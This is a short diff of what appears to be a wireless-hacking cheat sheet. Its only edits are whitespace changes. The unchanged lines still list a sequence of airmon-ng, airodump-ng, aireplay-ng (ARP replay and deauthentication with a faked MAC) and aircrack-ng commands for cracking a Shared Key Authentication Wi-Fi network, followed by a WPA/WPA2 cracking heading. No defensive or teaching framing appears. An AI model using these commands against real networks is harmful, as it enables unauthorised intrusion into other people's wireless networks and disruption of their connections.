@@ -95,8 +95,8 @@ root@mert:~ aircrack-ng <PCAP_of_FileName>
 
 
 
-
 Method 5 : SKA (Shared Key Authentication) Type Cracking
+
 
 root@mert:~airmon-ng start wlan0
 root@mert:~airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
@@ -107,7 +107,7 @@ root@mert:~ifconfig wlan0mon up
 root@mert:~aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
 root@mert:~aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> wlan0mon
 root@mert:~aircrack-ng <PCAP_of_FileName>
-----------------------------------------------------------------------------------------------------------
+
 
 
 WPA / WPA2 CRACKING
